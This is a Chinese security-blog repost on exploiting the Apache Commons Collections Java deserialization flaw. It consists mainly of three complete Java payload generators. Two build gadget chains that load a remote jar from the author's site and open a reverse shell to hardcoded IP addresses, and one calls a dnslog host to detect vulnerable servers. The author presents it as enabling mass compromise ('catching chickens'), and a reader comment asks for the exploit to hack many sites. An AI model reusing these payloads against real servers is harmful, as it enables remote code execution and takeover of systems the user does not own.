}</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(255, 0, 0); font-size: 18px;"><strong><span style="color: rgb(255, 0, 0); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 0, 0); font-size: 18px;"><strong><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">漏洞高级利用</span></strong><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">现在网上给出的poc只能执行命令或者写个文件之类的,本文将介绍一种通用的漏洞利用方法,只要服务器可以出网,就可以进行任何操作,例如反弹个shell,写文件?当然还有抓鸡等。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">漏洞原理什么的在上面已经分析过了,网上的POC都是调用RunTime.getRuntime().exec(“cmdxx”),很多人在问这个漏洞执行命令后能不能回显,对于回显,其实就是想办法拿到容器的response,但是非常遗憾,我在对jboss进行测试时并未找到一种方式可以获取当当前请求的response,其他容器就不清楚了,理论上只要找到一个方法可以获取到当前请求的response,那么回显就搞定了,期待有大牛来实现。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">到目前为止,我们只能通过反射的方式来进行函数调用,如果要实现复杂的功能,估计构造POC会把人折磨死,所以是不是有一种通用的方法去加载我们的payload呢。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">在java中有个URLClassLoader类,关于该类的作用大家自己去百度,简单说就是远程加载class到本地jvm中,说到这,我想稍微明白一点的就知道怎么做了,这里不废话了,文章写得累死了,直接给出POC吧,至于具体怎么利用,如何实现抓鸡等,明白人自然就明白。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 0, 0);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">反弹shell</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">反弹shell的原理,通过classload从我博客远程加载一个</span><a href="http://www.isiwn.org/attach/iswin.jar%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%9B%E8%A1%8C%E5%AE%9E%E4%BE%8B%E5%8C%96%EF%BC%8C%E5%8D%9A%E5%AE%A2%E4%B8%8A%E7%9A%84jar%E6%96%87%E4%BB%B6%E9%87%8C%E9%9D%A2%E5%8C%85%E5%90%AB%E4%BA%86%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%84%9A%E6%9C%AC,%E5%B0%86%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%88%B0%E6%9C%AC%E5%9C%B0%E5%90%8E%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AE%9E%E4%BE%8B%E5%8C%96%E6%97%B6%E5%9C%A8%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E4%B8%AD%E6%89%A7%E8%A1%8C%E5%8F%8D%E5%BC%B9shell%E7%9A%84payload%E3%80%82" target="_blank" rel="external" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline; font-size: 14px;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">http://www.isiwn.org/attach/iswin.jar文件,然后进行实例化,博客上的jar文件里面包含了反弹shell的脚本,将类加载到本地后实例化实例化时在构造方法中执行反弹shell的payload。</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 0, 0);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">直接上代码</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">LazyMap的实现方式</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">我已经对网上的poc进行了修改,修改的更加容易阅读,方便大家学习。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:java;toolbar:false">package&nbsp;ysoserial.payloads;
import&nbsp;java.io.File;
import&nbsp;java.io.FileOutputStream;
import&nbsp;java.io.ObjectOutputStream;
import&nbsp;java.lang.annotation.Retention;
import&nbsp;java.lang.reflect.Constructor;
import&nbsp;java.lang.reflect.Field;
import&nbsp;java.lang.reflect.InvocationHandler;
import&nbsp;java.lang.reflect.Proxy;
import&nbsp;java.util.HashMap;
import&nbsp;java.util.Map;
import&nbsp;org.apache.commons.collections.Transformer;
import&nbsp;org.apache.commons.collections.functors.ChainedTransformer;
import&nbsp;org.apache.commons.collections.functors.ConstantTransformer;
import&nbsp;org.apache.commons.collections.functors.InvokerTransformer;
import&nbsp;org.apache.commons.collections.map.LazyMap;
public&nbsp;class&nbsp;CommonsCollections1{
public&nbsp;InvocationHandler&nbsp;getObject(final&nbsp;String&nbsp;ip)&nbsp;throws&nbsp;Exception&nbsp;{
//&nbsp;inert&nbsp;chain&nbsp;for&nbsp;setup
final&nbsp;Transformer&nbsp;transformerChain&nbsp;=&nbsp;new&nbsp;ChainedTransformer(
new&nbsp;Transformer[]&nbsp;{&nbsp;new&nbsp;ConstantTransformer(1)&nbsp;});
//&nbsp;real&nbsp;chain&nbsp;for&nbsp;after&nbsp;setup
final&nbsp;Transformer[]&nbsp;transformers&nbsp;=&nbsp;new&nbsp;Transformer[]&nbsp;{
new&nbsp;ConstantTransformer(java.net.URLClassLoader.class),
//&nbsp;getConstructor&nbsp;class.class&nbsp;classname
new&nbsp;InvokerTransformer(&quot;getConstructor&quot;,
new&nbsp;Class[]&nbsp;{&nbsp;Class[].class&nbsp;},
new&nbsp;Object[]&nbsp;{&nbsp;new&nbsp;Class[]&nbsp;{&nbsp;java.net.URL[].class&nbsp;}&nbsp;}),
//&nbsp;newinstance&nbsp;string&nbsp;http://www.iswin.org/attach/iswin.jar
new&nbsp;InvokerTransformer(
&quot;newInstance&quot;,
new&nbsp;Class[]&nbsp;{&nbsp;Object[].class&nbsp;},
new&nbsp;Object[]&nbsp;{&nbsp;new&nbsp;Object[]&nbsp;{&nbsp;new&nbsp;java.net.URL[]&nbsp;{&nbsp;new&nbsp;java.net.URL(
&quot;http://www.iswin.org/attach/iswin.jar&quot;)&nbsp;}&nbsp;}&nbsp;}),
//&nbsp;loadClass&nbsp;String.class&nbsp;R
new&nbsp;InvokerTransformer(&quot;loadClass&quot;,
new&nbsp;Class[]&nbsp;{&nbsp;String.class&nbsp;},&nbsp;new&nbsp;Object[]&nbsp;{&nbsp;&quot;R&quot;&nbsp;}),
//&nbsp;set&nbsp;the&nbsp;target&nbsp;reverse&nbsp;ip&nbsp;and&nbsp;port
new&nbsp;InvokerTransformer(&quot;getConstructor&quot;,
new&nbsp;Class[]&nbsp;{&nbsp;Class[].class&nbsp;},
new&nbsp;Object[]&nbsp;{&nbsp;new&nbsp;Class[]&nbsp;{&nbsp;String.class&nbsp;}&nbsp;}),
//&nbsp;invoke
new&nbsp;InvokerTransformer(&quot;newInstance&quot;,
new&nbsp;Class[]&nbsp;{&nbsp;Object[].class&nbsp;},
new&nbsp;Object[]&nbsp;{&nbsp;new&nbsp;String[]&nbsp;{&nbsp;ip&nbsp;}&nbsp;}),
new&nbsp;ConstantTransformer(1)&nbsp;};
final&nbsp;Map&nbsp;innerMap&nbsp;=&nbsp;new&nbsp;HashMap();
final&nbsp;Map&nbsp;lazyMap&nbsp;=&nbsp;LazyMap.decorate(innerMap,&nbsp;transformerChain);
//this&nbsp;will&nbsp;generate&nbsp;a&nbsp;AnnotationInvocationHandler(Override.class,lazymap)&nbsp;invocationhandler
InvocationHandler&nbsp;invo&nbsp;=&nbsp;(InvocationHandler)&nbsp;getFirstCtor(
&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
.newInstance(Retention.class,&nbsp;lazyMap);
//generate&nbsp;object&nbsp;which&nbsp;implements&nbsp;specifiy&nbsp;interface&nbsp;
final&nbsp;Map&nbsp;mapProxy&nbsp;=&nbsp;Map.class.cast(Proxy.newProxyInstance(this
.getClass().getClassLoader(),&nbsp;new&nbsp;Class[]&nbsp;{&nbsp;Map.class&nbsp;},&nbsp;invo));
final&nbsp;InvocationHandler&nbsp;handler&nbsp;=&nbsp;(InvocationHandler)&nbsp;getFirstCtor(
&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
.newInstance(Retention.class,&nbsp;mapProxy);
setFieldValue(transformerChain,&nbsp;&quot;iTransformers&quot;,&nbsp;transformers);
return&nbsp;handler;
}
public&nbsp;static&nbsp;Constructor&lt;?&gt;&nbsp;getFirstCtor(final&nbsp;String&nbsp;name)
throws&nbsp;Exception&nbsp;{
final&nbsp;Constructor&lt;?&gt;&nbsp;ctor&nbsp;=&nbsp;Class.forName(name)
.getDeclaredConstructors()[0];
ctor.setAccessible(true);
return&nbsp;ctor;
}
public&nbsp;static&nbsp;Field&nbsp;getField(final&nbsp;Class&lt;?&gt;&nbsp;clazz,&nbsp;final&nbsp;String&nbsp;fieldName)
throws&nbsp;Exception&nbsp;{
Field&nbsp;field&nbsp;=&nbsp;clazz.getDeclaredField(fieldName);
if&nbsp;(field&nbsp;==&nbsp;null&nbsp;&amp;&amp;&nbsp;clazz.getSuperclass()&nbsp;!=&nbsp;null)&nbsp;{
field&nbsp;=&nbsp;getField(clazz.getSuperclass(),&nbsp;fieldName);
}
field.setAccessible(true);
return&nbsp;field;
}
public&nbsp;static&nbsp;void&nbsp;setFieldValue(final&nbsp;Object&nbsp;obj,&nbsp;final&nbsp;String&nbsp;fieldName,
final&nbsp;Object&nbsp;value)&nbsp;throws&nbsp;Exception&nbsp;{
final&nbsp;Field&nbsp;field&nbsp;=&nbsp;getField(obj.getClass(),&nbsp;fieldName);
field.set(obj,&nbsp;value);
}
public&nbsp;static&nbsp;void&nbsp;main(final&nbsp;String[]&nbsp;args)&nbsp;throws&nbsp;Exception&nbsp;{
final&nbsp;Object&nbsp;objBefore&nbsp;=&nbsp;CommonsCollections1.class.newInstance()
.getObject(&quot;10.18.180.34:8080&quot;);
//deserialize(serialize(objBefore));
File&nbsp;f&nbsp;=&nbsp;new&nbsp;File(&quot;/Users/iswin/Downloads/payloadsfinal.bin&quot;);
ObjectOutputStream&nbsp;out&nbsp;=&nbsp;new&nbsp;ObjectOutputStream(new&nbsp;FileOutputStream(f));
out.writeObject(objBefore);
out.flush();
out.close();
}
}</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 0, 0);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;">效果</span><br/></strong></span></p><p style="text-align: center;"><a href="http://www.iswin.org/attach/reverse.png" title="" rel="article0"><img src="http://p8.qhimg.com/t01616517de9852d94c.jpg" style="-webkit-margin-before: 0px; -webkit-margin-after: 0px; margin: 0px; padding: 0.7em 0px 0px; border: none; outline: 0px; font-weight: inherit; font-style: inherit; vertical-align: middle; max-width: 100%; height: auto;" height="400"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">TransformedMap的实现方式</span></strong></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">直接上代码</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:java;toolbar:false">import&nbsp;java.io.File;
import&nbsp;java.io.FileInputStream;
import&nbsp;java.io.FileNotFoundException;
import&nbsp;java.io.FileOutputStream;
import&nbsp;java.io.IOException;
import&nbsp;java.io.ObjectInputStream;
import&nbsp;java.io.ObjectOutputStream;
import&nbsp;java.lang.annotation.Retention;
import&nbsp;java.lang.reflect.Constructor;
import&nbsp;java.util.HashMap;
import&nbsp;java.util.Map;
import&nbsp;java.util.Map.Entry;
import&nbsp;org.apache.commons.collections.Transformer;
import&nbsp;org.apache.commons.collections.functors.ChainedTransformer;
import&nbsp;org.apache.commons.collections.functors.ConstantTransformer;
import&nbsp;org.apache.commons.collections.functors.InvokerTransformer;
import&nbsp;org.apache.commons.collections.map.TransformedMap;
/**
&nbsp;*&nbsp;@ClassName:&nbsp;Main.java
&nbsp;*&nbsp;@Description:&nbsp;TODO
&nbsp;*&nbsp;@author&nbsp;iswin
&nbsp;*&nbsp;@email&nbsp;admin@iswin.org
&nbsp;*&nbsp;@Date&nbsp;2015年11月8日&nbsp;下午12:12:13
&nbsp;*/
public&nbsp;class&nbsp;Main&nbsp;{
public&nbsp;static&nbsp;Object&nbsp;Reverse_Payload(String&nbsp;ip,&nbsp;int&nbsp;port)&nbsp;throws&nbsp;Exception&nbsp;{
final&nbsp;Transformer[]&nbsp;transforms&nbsp;=&nbsp;new&nbsp;Transformer[]&nbsp;{
new&nbsp;ConstantTransformer(java.net.URLClassLoader.class),
//&nbsp;getConstructor&nbsp;class.class&nbsp;classname
new&nbsp;InvokerTransformer(&quot;getConstructor&quot;,
new&nbsp;Class[]&nbsp;{&nbsp;Class[].class&nbsp;},
new&nbsp;Object[]&nbsp;{&nbsp;new&nbsp;Class[]&nbsp;{&nbsp;java.net.URL[].class&nbsp;}&nbsp;}),
//&nbsp;newinstance&nbsp;string&nbsp;http://www.iswin.org/attach/iswin.jar
new&nbsp;InvokerTransformer(
&quot;newInstance&quot;,
new&nbsp;Class[]&nbsp;{&nbsp;Object[].class&nbsp;},
new&nbsp;Object[]&nbsp;{&nbsp;new&nbsp;Object[]&nbsp;{&nbsp;new&nbsp;java.net.URL[]&nbsp;{&nbsp;new&nbsp;java.net.URL(
&quot;http://www.iswin.org/attach/iswin.jar&quot;)&nbsp;}&nbsp;}&nbsp;}),
//&nbsp;loadClass&nbsp;String.class&nbsp;R
new&nbsp;InvokerTransformer(&quot;loadClass&quot;,
new&nbsp;Class[]&nbsp;{&nbsp;String.class&nbsp;},&nbsp;new&nbsp;Object[]&nbsp;{&nbsp;&quot;R&quot;&nbsp;}),
//&nbsp;set&nbsp;the&nbsp;target&nbsp;reverse&nbsp;ip&nbsp;and&nbsp;port
new&nbsp;InvokerTransformer(&quot;getConstructor&quot;,
new&nbsp;Class[]&nbsp;{&nbsp;Class[].class&nbsp;},
new&nbsp;Object[]&nbsp;{&nbsp;new&nbsp;Class[]&nbsp;{&nbsp;String.class&nbsp;}&nbsp;}),
//&nbsp;invoke
new&nbsp;InvokerTransformer(&quot;newInstance&quot;,
new&nbsp;Class[]&nbsp;{&nbsp;Object[].class&nbsp;},
new&nbsp;Object[]&nbsp;{&nbsp;new&nbsp;String[]&nbsp;{&nbsp;ip&nbsp;+&nbsp;&quot;:&quot;&nbsp;+&nbsp;port&nbsp;}&nbsp;}),
new&nbsp;ConstantTransformer(1)&nbsp;};
Transformer&nbsp;transformerChain&nbsp;=&nbsp;new&nbsp;ChainedTransformer(transforms);
Map&nbsp;innermap&nbsp;=&nbsp;new&nbsp;HashMap();
innermap.put(&quot;value&quot;,&nbsp;&quot;value&quot;);
Map&nbsp;outmap&nbsp;=&nbsp;TransformedMap.decorate(innermap,&nbsp;null,&nbsp;transformerChain);
Class&nbsp;cls&nbsp;=&nbsp;Class
.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
Constructor&nbsp;ctor&nbsp;=&nbsp;cls.getDeclaredConstructor(Class.class,&nbsp;Map.class);
ctor.setAccessible(true);
Object&nbsp;instance&nbsp;=&nbsp;ctor.newInstance(Retention.class,&nbsp;outmap);
return&nbsp;instance;
}
public&nbsp;static&nbsp;void&nbsp;main(String[]&nbsp;args)&nbsp;throws&nbsp;Exception&nbsp;{
GeneratePayload(Reverse_Payload(&quot;146.185.182.237&quot;,&nbsp;8090),
&quot;/Users/iswin/Downloads/test.bin&quot;);
}
public&nbsp;static&nbsp;void&nbsp;GeneratePayload(Object&nbsp;instance,&nbsp;String&nbsp;file)
throws&nbsp;Exception&nbsp;{
File&nbsp;f&nbsp;=&nbsp;new&nbsp;File(file);
ObjectOutputStream&nbsp;out&nbsp;=&nbsp;new&nbsp;ObjectOutputStream(new&nbsp;FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public&nbsp;static&nbsp;void&nbsp;payloadTest(String&nbsp;file)&nbsp;throws&nbsp;Exception&nbsp;{
//&nbsp;这里为测试上面的tansform是否会触发payload
//&nbsp;Map.Entry&nbsp;onlyElement&nbsp;=(Entry)&nbsp;outmap.entrySet().iterator().next();
//&nbsp;onlyElement.setValue(&quot;foobar&quot;);
ObjectInputStream&nbsp;in&nbsp;=&nbsp;new&nbsp;ObjectInputStream(new&nbsp;FileInputStream(file));
in.readObject();
in.close();
}
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">漏洞检测?</span><br/></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这里提供一个poc供大家进行检测,其实就是发送一个http请求到指定ip,然后参数中带有特定特征来判断是否存在漏洞,直接观察日志就可以了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:java;toolbar:false">package&nbsp;iswin;
import&nbsp;java.io.File;
import&nbsp;java.io.FileOutputStream;
import&nbsp;java.io.ObjectOutputStream;
import&nbsp;java.lang.reflect.Constructor;
import&nbsp;java.lang.reflect.Field;
import&nbsp;java.lang.reflect.InvocationHandler;
import&nbsp;java.lang.reflect.Proxy;
import&nbsp;java.util.HashMap;
import&nbsp;java.util.Map;
import&nbsp;org.apache.commons.collections.Transformer;
import&nbsp;org.apache.commons.collections.functors.ChainedTransformer;
import&nbsp;org.apache.commons.collections.functors.ConstantTransformer;
import&nbsp;org.apache.commons.collections.functors.InvokerTransformer;
import&nbsp;org.apache.commons.collections.map.LazyMap;
public&nbsp;class&nbsp;CommonsCollections1&nbsp;{
public&nbsp;InvocationHandler&nbsp;getObject(final&nbsp;String&nbsp;ip)&nbsp;throws&nbsp;Exception&nbsp;{
final&nbsp;Transformer&nbsp;transformerChain&nbsp;=&nbsp;new&nbsp;ChainedTransformer(
new&nbsp;Transformer[]&nbsp;{&nbsp;new&nbsp;ConstantTransformer(1)&nbsp;});
final&nbsp;Transformer[]&nbsp;transformers&nbsp;=&nbsp;new&nbsp;Transformer[]&nbsp;{
new&nbsp;ConstantTransformer(java.net.URL.class),
new&nbsp;InvokerTransformer(&quot;getConstructor&quot;,
new&nbsp;Class[]&nbsp;{&nbsp;Class[].class&nbsp;},
new&nbsp;Object[]&nbsp;{&nbsp;new&nbsp;Class[]&nbsp;{&nbsp;String.class&nbsp;}&nbsp;}),
new&nbsp;InvokerTransformer(&quot;newInstance&quot;,
new&nbsp;Class[]&nbsp;{&nbsp;Object[].class&nbsp;},
new&nbsp;Object[]&nbsp;{&nbsp;new&nbsp;String[]&nbsp;{&nbsp;ip&nbsp;}&nbsp;}),
new&nbsp;InvokerTransformer(&quot;openStream&quot;,&nbsp;new&nbsp;Class[]&nbsp;{},
new&nbsp;Object[]&nbsp;{}),&nbsp;new&nbsp;ConstantTransformer(1)&nbsp;};
//&nbsp;final&nbsp;Map&nbsp;innerMap&nbsp;=&nbsp;new&nbsp;HashMap();
//
//&nbsp;final&nbsp;Map&nbsp;lazyMap&nbsp;=&nbsp;LazyMap.decorate(new&nbsp;HashMap(),
//&nbsp;transformerChain);
//&nbsp;this&nbsp;will&nbsp;generate&nbsp;a
//&nbsp;AnnotationInvocationHandler(Override.class,lazymap)&nbsp;invocationhandler
InvocationHandler&nbsp;invo&nbsp;=&nbsp;(InvocationHandler)&nbsp;getFirstCtor(
&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
.newInstance(Override.class,
LazyMap.decorate(new&nbsp;HashMap(),&nbsp;transformerChain));
final&nbsp;Map&nbsp;mapProxy&nbsp;=&nbsp;Map.class.cast(Proxy.newProxyInstance(this
.getClass().getClassLoader(),&nbsp;new&nbsp;Class[]&nbsp;{&nbsp;Map.class&nbsp;},&nbsp;invo));
final&nbsp;InvocationHandler&nbsp;handler&nbsp;=&nbsp;(InvocationHandler)&nbsp;getFirstCtor(
&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
.newInstance(Override.class,&nbsp;mapProxy);
setFieldValue(transformerChain,&nbsp;&quot;iTransformers&quot;,&nbsp;transformers);
return&nbsp;handler;
}
public&nbsp;static&nbsp;Constructor&lt;?&gt;&nbsp;getFirstCtor(final&nbsp;String&nbsp;name)
throws&nbsp;Exception&nbsp;{
final&nbsp;Constructor&lt;?&gt;&nbsp;ctor&nbsp;=&nbsp;Class.forName(name)
.getDeclaredConstructors()[0];
ctor.setAccessible(true);
return&nbsp;ctor;
}
public&nbsp;static&nbsp;Field&nbsp;getField(final&nbsp;Class&lt;?&gt;&nbsp;clazz,&nbsp;final&nbsp;String&nbsp;fieldName)
throws&nbsp;Exception&nbsp;{
Field&nbsp;field&nbsp;=&nbsp;clazz.getDeclaredField(fieldName);
if&nbsp;(field&nbsp;==&nbsp;null&nbsp;&amp;&amp;&nbsp;clazz.getSuperclass()&nbsp;!=&nbsp;null)&nbsp;{
field&nbsp;=&nbsp;getField(clazz.getSuperclass(),&nbsp;fieldName);
}
field.setAccessible(true);
return&nbsp;field;
}
public&nbsp;static&nbsp;void&nbsp;setFieldValue(final&nbsp;Object&nbsp;obj,&nbsp;final&nbsp;String&nbsp;fieldName,
final&nbsp;Object&nbsp;value)&nbsp;throws&nbsp;Exception&nbsp;{
final&nbsp;Field&nbsp;field&nbsp;=&nbsp;getField(obj.getClass(),&nbsp;fieldName);
field.set(obj,&nbsp;value);
}
public&nbsp;static&nbsp;void&nbsp;main(final&nbsp;String[]&nbsp;args)&nbsp;throws&nbsp;Exception&nbsp;{
final&nbsp;Object&nbsp;objBefore&nbsp;=&nbsp;CommonsCollections1.class.newInstance()
.getObject(&quot;http://abc.333d61.dnslog.info/tangscan/iswin.jpg&quot;);
File&nbsp;f&nbsp;=&nbsp;new&nbsp;File(&quot;/Users/iswin/Downloads/hello.bin&quot;);
ObjectOutputStream&nbsp;out&nbsp;=&nbsp;new&nbsp;ObjectOutputStream(new&nbsp;FileOutputStream(f));
out.writeObject(objBefore);
out.flush();
out.close();
//&nbsp;Serializables.deserialize(Serializables.serialize(objBefore));
}
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"></span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">参考资料</span><br/></strong></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">[1] :</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline; font-size: 14px;"><a href="https://github.com/frohoff/ysoserial/" target="_blank" rel="external" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline; font-size: 14px;">https://github.com/frohoff/ysoserial/</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">[2] :</span><a href="http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#jboss" target="_blank" rel="external" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline; font-size: 14px;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#jboss</span></a></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文转载自 iswin<br/><a class="text-more" href="http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/" target="_blank">原文链接：http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="2268" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="64d932c9bb50dc5a83db601d9b02e735">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/6x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="339680863" class="response" data-bind-id="339680863" data-target="1447" user-name="helen" href="javascript:;">
                helen            </a>
                        <span class="comment-time">2015-11-17 18:38:23</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="339680863" data-target="1447">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_1447" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">来来来，我是helen 给我exp 我要打一堆站屯着</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/9x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="1420" user-name="寂寞哥" href="javascript:;">
                寂寞哥            </a>
                        <span class="comment-time">2015-11-17 11:34:30</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="1420">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_1420" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">ooollllll</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="2268" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
